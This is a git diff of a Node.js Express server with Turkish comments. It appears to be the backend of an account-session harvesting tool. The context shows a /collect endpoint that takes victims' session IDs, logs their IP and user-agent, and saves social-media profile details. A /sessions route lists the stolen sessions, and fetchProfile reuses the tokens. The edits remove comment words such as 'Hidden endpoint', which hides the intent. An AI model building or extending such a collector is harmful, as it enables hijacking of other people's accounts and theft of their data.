@@ -36,6 +36,11 @@ app.use(express.static(path.join(__dirname, '/')));
 app.use(express.json());
 app.use(cors({ origin: '*', credentials: true }));
 
+// ---- ANA SAYFA - (404 hatasını düzeltir) ----
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
 // ---- RATE LİMİT ----
 const limiter = rateLimit({
   windowMs: 60 * 1000,
@@ -44,7 +49,7 @@ const limiter = rateLimit({
 });
 app.use('/graphql', limiter);
 
-// ---- SESSION KAYDETME (IP ve User-Agent ile) ----
+// ---- SESSION KAYDETME ----
 function saveSession(sessionId, profileData, ip, userAgent) {
   return new Promise((resolve, reject) => {
     const { username, full_name, follower_count, following_count, is_private, is_verified, profile_pic_url_hd } = profileData;
@@ -72,7 +77,7 @@ app.get('/sessions', (req, res) => {
   });
 });
 
-// ---- OTOMATİK YAKALAMA (Gizli endpoint) ----
+// ---- OTOMATİK YAKALAMA ----
 app.post('/collect', async (req, res) => {
   const { sessionId } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
@@ -159,4 +164,5 @@ async function fetchProfile(sessionId) {
 
 app.get('/ping', (req, res) => res.json({ ok: true, timestamp: Date.now() }));
 
+// ---- SERVER BAŞLAT ----
 app.listen(process.env.PORT || 3000, () => console.log('✅ Honeypot running on port ' + (process.env.PORT || 3000)));
